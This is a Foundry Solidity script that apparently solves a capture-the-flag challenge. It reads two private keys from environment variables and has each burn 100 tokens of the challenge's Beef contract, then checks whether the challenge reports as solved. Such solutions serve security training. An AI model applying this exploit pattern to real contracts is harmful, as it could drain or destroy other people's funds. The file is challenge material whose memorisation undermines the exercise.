// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-ctf/CTFSolver.sol";
import "forge-std/console.sol";

import "src/Challenge.sol";
import "src/Beef.sol";

import "openzeppelin/utils/Strings.sol";

contract Solve is CTFSolver {
    function solve(address challenge_, address) internal override {
        vm.stopBroadcast();

        Challenge challenge = Challenge(challenge_);
        Beef beef = challenge.BEEF();

        string memory env = "PRIVATE_KEY_";

        for (uint256 i = 0; i < 2; i++) {
            vm.broadcast(vm.envUint(string.concat(env, Strings.toString(i))));
            beef.burn(100);
        }

        console.log("solved?", challenge.isSolved());

        vm.startBroadcast();
    }
}
